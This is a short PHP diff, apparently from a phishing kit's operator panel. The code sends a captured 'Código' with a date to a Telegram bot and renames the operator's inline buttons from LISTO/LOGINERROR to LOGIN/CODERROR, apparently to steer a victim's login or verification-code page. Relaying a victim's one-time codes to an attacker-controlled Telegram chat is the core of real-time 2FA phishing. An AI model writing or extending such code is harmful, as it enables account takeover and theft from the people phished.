@@ -49,8 +49,8 @@ if ($type === 'phone') {
     $msg .= "💬 Código: {$code}\n";
     $msg .= "🕒 Fecha: {$date}\n";
     $keyboard = json_encode(['inline_keyboard'=>[[
-        ['text'=>'✅ LISTO',      'callback_data'=>"LISTO|{$u}"],
-        ['text'=>'❌ LOGINERROR', 'callback_data'=>"LOGINERROR|{$u}"],
+        ['text'=>'✅ LOGIN',      'callback_data'=>"LOGIN|{$u}"],
+        ['text'=>'❌ CODERROR',   'callback_data'=>"CODERROR|{$u}"],
     ]]]);
     file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query([
         'chat_id'=>$chat_id, 'text'=>$msg, 'reply_markup'=>$keyboard,
